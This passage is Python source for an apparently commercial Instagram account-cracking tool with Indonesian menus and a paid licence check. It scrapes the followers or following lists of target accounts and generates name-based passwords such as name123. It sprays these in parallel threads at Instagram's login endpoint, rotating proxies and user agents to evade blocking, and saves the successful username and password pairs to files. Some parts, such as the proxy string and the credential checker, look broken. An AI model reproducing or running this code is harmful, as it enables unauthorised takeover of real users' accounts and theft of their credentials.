			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['full_name']
			#pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''

class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			banner()
			prints(Panel(f"{H2}{IP}",title=f"{P2}IP",subtitle=f"{P2}{CN}",width=80,padding=(0,30),style=f"{color_table}"))
			BrayennnXD.append(Panel(f"{P2}nama      : {H2}{nama}\n{P2}username  : {H2}{self.username}",width=39,padding=(0,2),style=f"{color_table}"))
			BrayennnXD.append(Panel(f"{P2}pengikut  : {H2}{followers}\n{P2}mengikuti : {H2}{following}",width=39,padding=(0,2),style=f"{color_table}"))
			console.print(Columns(BrayennnXD))
			prints(Panel(f"{P2}selamat datang {H2}{nama} {P2}gunakan tools dengan bijak :)",width=80,padding=(0,9),style=f"{color_table}"))
			prints(Panel(f"{P2}[{H2}01{P2}]. dump id pencarian nama       {P2}[{H2}05{P2}]. lihat hasil crack\n{P2}[{H2}02{P2}]. dump id pengikut             {P2}[{H2}06{P2}]. bot auto unfollow\n{P2}[{H2}03{P2}]. dump id mengikuti            {P2}[{H2}07{P2}]. report bug script\n{P2}[{H2}04{P2}]. crack ulang hasil cp         {P2}[{H2}00{P2}]. keluar tools",width=80,padding=(0,4),style=f"{color_table}"))


	def BUG(self):
		prints(Panel(f"Bantu saya mengembangkan script ini . apapun bugnya tolong laporkan kepada saya, semakin dikit bugnya semakin baik scriptnya.\nAnda bisa melaporkan langsung ke wa admin +62 896-2215-5832"))
		os.system("xdg-open https://wa.me/+6289622155832?text=Selamat+Pagi+Bang+Saya+Mau+Melaporkan+Bug+Pada+Sc+Mu+Bang")
		time.sleep(3)
		exit()

	def Exit(self):
		print(f" {H}# {P}apakah anda yakin ingin keluar? Y atau t ")
		x=input(f' {H}# {P}choose : ')
		if x in ('y','Y'):removeDATA()
		elif x in ('t','T'):self.menu()
		else:self.Exit()

	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=generateUUID(True)
		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})

		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


	def searchAPI(self,cookie,nama):
		try:
			x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":_UserAgent_()})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				user=i['user']
				username=user['username']
				fullname=user['full_name']
				internal.append(f'{username}|{fullname}')
		except requests.exceptions.ConnectionError:
			exit(f' {H}# {P}koneksi internet bermasalah')
		return internal

	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":_UserAgent_(),"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				exit(f' {H}# {P}koneksi internet bermasalah')
			except Exception as e:
				exit(f" {H}# {P}username yang anda masukan tidak di temukan")
			return idx
		else:lisensi()

	def infoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":_UserAgent_()})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (99999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":_UserAgent_()})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
								
							try:
 								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				exit(f' {H}# {P}koneksi internet bermasalah')
			except Exception as e:
				exit(f" {H}# {P}username yang anda masukan tidak di temukan")
			return internal
		else:lisensi()
		
	def ifoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":_UserAgent_()})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (99999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":_UserAgent_()})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
								
							try:
 								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				exit(f' {H}# {P}koneksi internet bermasalah')
			except Exception as e:
				exit(f" {H}# {P}username yang anda masukan tidak di temukan")
			return internal
		else:lisensi()
	
	def passwordAPI(self,xnx):
		print(f" {H}# {P}total {K}{len(internal)}{P} id terkumpul")
		prints(Panel(f"{P2}[{H2}01{P2}]. nama, nama123\n{P2}[{H2}02{P2}]. nama, nama123, nama1234\n{P2}[{H2}03{P2}]. nama, nama123, nama1234, nama12345\n{P2}[{H2}04{P2}]. nama123, nama123, password manual",width=80,padding=(0,16),style=f"{color_table}"))
		c=input(f' {H}# {P}choose password : ')
		if c=='1':
		      self.generateAPI(xnx,c,setting_proxy())
		elif c=='2':
		    self.generateAPI(xnx,c,setting_proxy())
		elif c=='3':
		      self.generateAPI(xnx,c,setting_proxy())
		elif c=='7':
		      self.generateAPI(xnx,c,setting_proxy())
		elif c=='4':
		    print(f' {H}# {P}contoh password : sayang, anjing, alhamdulilah')
		    zx=input(f' {H}# {P}password : ')
		    self.generateAPI(xnx,c,zx,setting_proxy())
		else:
			self.passwordAPI(xnx,setting_proxy())

	def generateAPI(self,user,o,zx=''):
		xxkontol.append(Panel(f"""   {H2}OK {P2}: {P2}result/{day}.txt""",width=39,style=f"{color_table}"))
		xxkontol.append(Panel(f"""   {K2}CP {P2}: {P2}result/{day}.txt""",width=39,style=f"{color_table}"))
		console.print(Columns(xxkontol))
		prints(Panel(f"{P2}Hidupkan Mode Pesawat 5 Detik Jika Terdeteksi Spam Ip",width=80,padding=(0,10),style=f"{color_table}"))
		with ThreadPoolExecutor(max_workers=15) as adtya:
			for i in user:
				try:
					username=i.split("|")[0]
					password=i.split("|")[1].lower()
					for w in password.split(" "):
						if len(w)<3:
							continue
						else:
							w=w.lower()
							if o=="1":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234']
								else:
									sandi=[w,w+'123',w+'1234']
							elif o=="2":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234',w+'12345']
								else:
									sandi=[w+'123',w,w+'1234',w+'12345',password.lower()]
							elif o=="3":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
								else:
									sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
							elif o=="4":
								if len(zx) > 3:
								                        sandi = zx.replace(" ", "").split(",")
								else:
									break
							adtya.submit(self.crackAPI,username,sandi)
				except:
					pass
		print('\n')
		oi='# CRACK SELESAI, APAPUN HASILNYA JANGAN LUPA BERSYUKUR'
		io=mark(oi,style='green')
		sol().print(io)
		os.system('xdg-open https://youtube.com/@vindradesign')
		exit()

	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":_UserAgent_(),"x-ig-app-id":'1217981644879628'})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			nama = '-'
			pengikut = '-'
			mengikut = '-'
			postingan = '-'
		return nama,pengikut,mengikut,postingan

	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		ua = random.choice(userAGENT)
		BrayennnXD = open("data/proxy.txt","r").read().splitlines()
		sys.stdout.write(f"\r {K}[ VINDRA-ID{P} {H}stabil{P} {loop}/{len(internal)} Ok-:{H}{len(success)} {P}Cp-:{K}{len(checkpoint)} {P}"),sys.stdout.flush()
		try: 
			for pw in pas:
				BrayennnXD = random.randint(1000000000, 99999999999)
				ts = calendar.timegm(current_GMT)
				proxy = {"http": "socks5://{random.choice(BrayennnXD)}"}
				rr=random.randint
				slebew=random.choice([f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; PFZM10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,104))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36","Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Lenovo TB-X505F Build/PKQ1.181218.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,104))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36","Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A260G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,104))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36"])
				p = ses.get('https://z-p42.www.instagram.com/api/v1/web/accounts/login/ajax/')
				headd = {
                    'Host': 'i.instagram.com',
                    'X-IG-WWW-Claim': '0',
                    'X-Instagram-AJAX': '1006629918',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-ASBD-ID': '198387',
                    'User-Agent': ua,
                    'X-CSRFToken': p.cookies['csrftoken'],
                    'X-IG-App-ID': '1217981644879628',
                    'Origin': 'https://i.instagram.com/',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://i.instagram.com/api/v1/web/direct/inbox/',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
				date = {
				    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
				    "username": user,
				    "queryParams": "{}",
				    "optIntoOneTap": "false",
				    "stopDeletionNonce": "",
				    "trustedDeviceRecords": "{}"}
				respon = ses.post("https://z-p42.www.instagram.com/api/v1/web/accounts/login/ajax/", headers = headd, data = date, proxies = proxy, allow_redirects = True)
				BrayennnXD = json.loads(respon.text)
				if 'userId' in str(BrayennnXD):
					nama,pengikut,mengikut,postingan = self.APIinfo(user)
					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					print("\r                                   ")
					BrayennnXD=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {ua}'
					BrayennnXD = nel(BrayennnXD, style='green')
					print('\n')
					cetak(nel(BrayennnXD,style='',title='\r[green]Live[white]'))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'checkpoint_url' in str(BrayennnXD):
					nama,pengikut,mengikut,postingan = self.APIinfo(user)
					print("\r                                   ")
					BrayennnXD=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {ua}'
					BrayennnXD = nel(BrayennnXD, style='yellow')
					print('\n')
					cetak(nel(BrayennnXD,style='', title='\r[yellow]Cepe[white]'))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f"\r {K}#{P} {M}SpamIP{P} {loop}/{len(internal)} Ok-:{H}{len(success)} {P}Cp-:{K}{len(checkpoint)} {P}"),sys.stdout.flush()
					time.sleep(10)
					self.crackAPI(user,pas)
				elif 'generic_request_error' in str(respon.text):
					sys.stdout.write(f"\r {K}#{P} {M}spamIP{P} {loop}/{len(internal)} Ok-:{H}{len(success)} {P}Cp-:{K}{len(checkpoint)} {P}"),sys.stdout.flush()
					time.sleep(10)
					self.crackAPI(user,pas)
				else:
					continue
			loop+=1
		except:self.crackAPI(user,pas)

	def checkAPI(self,usr,pwd):
		try:
			ts = calendar.timegm(current_GMT)
			BrayennnXD = open("data/proxy.txt","r").read().splitlines()
			proxy = {"http": "socks5://{random.choice(BrayennnXD)}"}
			token = s.get("https://www.instagram.com/accounts/login",headers={"user-agent":_UserAgent_()}).content
			crf_token = re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
			headd = {
				'authority': 'www.instagram.com',
				'connection': 'keep-alive',
				'sec-ch-ua': '";Not A Brand";v="99", "Chromium";v="94"',
				'x-ig-app-id': '1217981644879628',
                'x-ig-www-claim': 'hmac.AR3jlStdcYspw88nLWvVnCDdiZ-KPvru_TasoSJlzGz-iXV2',
                 'x-requested-with': 'XMLHttpRequest',
				'sec-ch-ua-mobile': '?1',
				'x-instagram-ajax': 'c6412f1b1b7b',
				'content-type': 'application/x-www-form-urlencoded',
				'accept': '*/*',
				'x-csrftoken': crf_token,
				'user-agent': _UserAgent_(),
				'x-asbd-id': '198387',
				'sec-ch-ua-platform': '"Android"',
				'origin': 'https://www.instagram.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://www.instagram.com/',
				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
			param = {
				"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
					"username": user,
					"optIntoOneTap": False,
					"queryParams": "{}",
					"stopDeletionNonce": "",
					"trustedDeviceRecords": "{}"}
			x=s.post("https://www.instagram.com/accounts/login/ajax/",headers = headd, data=param,proxies=proxy)
			x_jason=json.loads(x.text)
			if "userId" in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""
    ├ {CY} LIVE CABUL{N}
	├ {CY}{user}|{pw}
	├ Followers {CY}{pengikut}
	├ Following {CY}{mengikut}
	├ Posts
  	 ∟ jumlah Post {CY}{postingan}""")
			elif 'checkpoint_url' in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""
    ├ {K}CEPE CABUL{N}
	├ {K}{user}|{pw}
	├ Followers {K}{pengikut}
	├ Following {K}{mengikut}
	├ Posts
  	 ∟ jumlah Post {K}{postingan}""")
			elif 'Please wait a few minutes' in str(x.text):
				sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
				self.checkAPI(usr,pwd)
		except:
			self.checkAPI(usr,pwd)

	def menu(self):
		self.logo()
		c = input(f" {H}> {P}pilih menu : ")
		if c in (''):
		  print(f" {H}# {P}isi, jangan kosong bro!")
		  time.sleep(3)
		  exit()
			
		elif c in ('1','01'):
			prints(Panel(f"{P2}mohon maaf untuk crack dari pencarian nama sedang di nonaktifkan",width=80,padding=(0,5),style=f"{color_table}"))
			os.system("xdg-open https://youtube.com/@vindradesign")
			time.sleep(3)
			exit()
			
		elif c in ('2','02'):
			prints(Panel(f"{P2}apakah anda ingin crack massal? Y atau t",width=80,padding=(0,16),style=f"{color_table}"))
			mas = input(f" {H}# {P}choose : ")
			if mas in ['y','Y']:
				masal(self)
			elif mas in ['t','T']:
				massal(self)
			elif mas in ['']:
				print(f" {H}# {P}isi, jangan kosong bro!")
				os.system("xdg-open https://youtube.com/@vindradesign")
				time.sleep(3)
				exit()

		elif c in ('3','03'):
			prints(Panel(f"{P2}apakah anda ingin crack massal? Y atau t",width=80,padding=(0,16),style=f"{color_table}"))
			mas = input(f" {H}# {P}choose : ")
			if mas in ['y','Y']:
				mengi(self)
			elif mas in ['t','T']:
				meng(self)
			elif mas in ['']:
				print(f" {H}# {P}isi, jangan kosong bro!")
				os.system("xdg-open https://youtube.com/@vindradesign")
				time.sleep(3)
				exit()

		elif c in ('4','04'):
			for i in os.listdir('result'):
				print(f' {H}# {P}{i}')
			prints(Panel(f"{P2}copy nama file di atas terus pastekan di bawah",width=80,padding=(0,15),style=f"{color_table}"))
			c=input(f' {H}# {P}masukan nama file : {H}')
			g=open("result/%s"%(c)).read().splitlines()
			print(f' {H}# {P}total results yang di temukan {H}{len(g)}{P}')
			print(f' {H}# {P}proses mengecek status akun harap tunggu sebentar')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit(f'\n\n {H}# {P}proses check selesai...')

		elif c in ('5','05'):
			cekResult()
			
		elif c in ('6','06'):
			prints(Panel(f"{P2}mohon maaf bot auto unfollow sedang di nonaktifkan",width=80,padding=(0,10),style=f"{color_table}"))
			os.system("xdg-open https://youtube.com/@vindradesign")
			time.sleep(3)
			exit()

		elif c in ('7','07'):
			self.BUG()
			
		elif c in ('0','00'):
			self.Exit()

		else:
			self.menu()
			
def tlisensi():
    lu()
    cetak(nel('[!] Lisensi Tidak Valid\n[!] Silahkan Ketik [green]"Buy"[/green] Untuk membeli lisensi'))
    time.sleep(2)
    lisen=input('[•] Masukan Lisensi : ')
    if lisen in ['']:
     print(f'{M}[!] JANGAN KOSONG{N}');sleep(1)
     tlisensi()
    if lisen in ['buy','Buy']:
     os.system('xdg-open https://wa.me/6289622155832?text=Bang+beli+lisensi+IG+nya+dong');exit()
    loadinglisen()
    open('.lisen.txt','w').write(lisen)
    lisensi()
    
def lisensi():
 try:
  cek=open('.lisen.txt').read()
  lisensikuni.append(cek)
 except:
  tlisensi()
 ses=requests.Session()
 res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzNTcyOTA3MCIsIndQYk4zUFZjR0ZQUTJEcnhTOHNoSWJQL3BTbGl0UlhES0JGMXFYVUQiXQ==&ProductId=18514&Key='+lisensikuni[0]).json()
 status=res['licenseKey']['key']
 if status ==cek:
  li()
  cetak(nel('\t[green] SELAMAT LISENSI ANDA VALID[/green]'))
  time.sleep(2)
  lisensiku.append("sukses")
  _loginPILL_()
 elif status ==KeyError:
  os.system('rm .lisen.txt')
 else:
  tlisensi()

def mengi(self):
			try:
				menudump.append('mengikuti')
				prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
				m=int(input(f' {H}# {P}masukan jumlah target : '))
			except:m=1
			for t in range(m):
				t +=1
				print(f" {H}# {P}total id {len(internal)}")
				nama=input(f' {H}# {P}masukan username : ')
				print(f" {H}# {P}wait...")
				id=self.idAPI(self.cookie,nama)
				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)

def meng(self):
	try:
		menudump.append('mengikuti')
		prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
		m=input(f' {H}# {P}username target : ')
		print(f" {H}# {P}wait...")
		id=self.idAPI(self.cookie,m)
		info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
		self.passwordAPI(info)
	except Exception as e:
		print(e)

def masal(self):
			try:
				menudump.append('pengikut')
				prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
				m=int(input(f' {H}# {P}masukan jumlah target : '))
			except:m=1
			for t in range(m):
				t +=1
				print(f" {H}# {P}total id {len(internal)}")
				nama=input(f' {H}# {P}masukan username : ')
				print(f" {H}# {P}wait...")
				id=self.idAPI(self.cookie,nama)
				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)


def massal(self):
			menudump.append('pengikut')
			prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
			m=input(f' {H}# {P}username target : ')
			print(f" {H}# {P}wait...")
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)

def key():
	os.system("clear");logo_lisensi();key = input(f" {H}• {P}masukan lisensi :{H} ")
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNTcyOTA3MCIsIndQYk4zUFZjR0ZQUTJEcnhTOHNoSWJQL3BTbGl0UlhES0JGMXFYVUQiXQ==&ProductId=18514&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar ke server InstaBrayen",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);_loginPILL_()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6289622155832?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

###----------[ CEK LISENSI ]---------- ###
def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNTcyOTA3MCIsIndQYk4zUFZjR0ZQUTJEcnhTOHNoSWJQL3BTbGl0UlhES0JGMXFYVUQiXQ==&ProductId=18514&Key=%s"%(x)).json()['licenseKey']['key'];_loginPILL_()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6289622155832?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

###----------[ MASUK LISENSI ]---------- ###
def key():
	os.system("clear") 
	banner()
	prints(Panel(f"{P2}admin tidak bertanggung jawab atas penyalahgunaan tools ini, jika tidak mengerti menggunakan tools ketik ( {H2}ADMIN {P2}) dan jika ingin menggunakan free user silahkan ketik ( {H2}TRIAL{P2} ) untuk mendapatkan lisensi gratis selama ( {H2}1 hari {P2}) ketik ( {H2}BELI {P2}) untuk lihat harga lisensi tools",title=f"{M2}• {K2}• {H2}• {P2}INFORMASI {H2}• {K2}• {M2}•",width=80,padding=(0,2),style=f"{color_table}"))
	key = input(f" {H}• {P}masukan lisensi :{H} ")
	if key in ["beli","Beli","BELI"]:beli_bang()
	elif key in ["admin","Admin","ADMIN"]:AdminAdtya()
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNTcyOTA3MCIsIndQYk4zUFZjR0ZQUTJEcnhTOHNoSWJQL3BTbGl0UlhES0JGMXFYVUQiXQ==&ProductId=18514&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar ke server InstaBrayen",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);_loginPILL_()
	except KeyError:
		prints(Panel(f"{P2} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu",width=80,padding=(0,1),style=f"{color_table}"));os.system("xdg-open https://wa.me/+6289622155832?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

###----------[ CEK LISENSI ]---------- ###				
def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNTcyOTA3MCIsIndQYk4zUFZjR0ZQUTJEcnhTOHNoSWJQL3BTbGl0UlhES0JGMXFYVUQiXQ==&ProductId=18514&Key=%s"%(x)).json()['licenseKey']['key'];_loginPILL_()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6289622155832?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

###----------[ ADMIN ]---------- ###	
def AdminAdtya():
    try:
        print(f" {H}• {P}anda akan di arahkan ke WhatsApp")
        os.system("xdg-open https://wa.me/+6289622155832");exit()
    except:pass

###----------[ BUY LISENSI ]---------- ###	
def beli_bang():
    prints(Panel(f"{P2}[{color_rich}1{P2}]. lisensi 1 minggu 50k\n{P2}[{color_rich}2{P2}]. lisensi 1 bulan 100k\n{P2}[{color_rich}3{P2}]. lisensi 2 bulan 150k\n{P2}[{color_rich}4{P2}]. permanen 250k\n{P2}[{color_rich}5{P2}]. kembali ( {H2}tools{P2} )",width=80,padding=(0,24),style=f"{color_table}"))
    zxc = input(f" {H}• {P}pilih lisensi : ")
    if zxc in [""]:print(f" {K}• {P}pilih yang bener broo jangan kosong !");time.sleep(3);cek_lisensi_aktif()
    elif zxc in ["1","01"]:os.system("xdg-open https://wa.me/+6289622155832?text=assalamualaikum+bang+mau+beli+lisensi+1+minggu");time.sleep(2);exit()
    elif zxc in ["2","02"]:os.system("xdg-open https://wa.me/+6289622155832?text=assalamualaikum+bang+mau+beli+lisensi+1+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:os.system("xdg-open https://wa.me/+6289622155832?text=assalamualaikum+bang+mau+beli+lisensi+2+bulan");time.sleep(2);exit()
    elif zxc in ["4","04"]:os.system("xdg-open https://wa.me/+6289622155832?text=assalamualaikum+bang+mau+beli+lisensi+permanen");time.sleep(2);exit()
    elif zxc in ["5","05"]:time.sleep(1);cek_lisensi_aktif()
    else:print(f" {K}• {P}ngetik apaan lu ngab ?");time.sleep(3);cek_lisensi_aktif()

###----------[ CEK LISENSI AKTIF ]---------- ###
def cek_lisensi_aktif():
	try:xz = open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	os.system("clear");cek()

if __name__=='__main__':
	try:
		os.system("git pull")
		os.system("xdg-open https://youtube.com/@vindradesign")
		_loginPILL_()
	except requests.exceptions.ConnectionError:
		exit(f' {H}# {P}koneksi internet bermasalah')
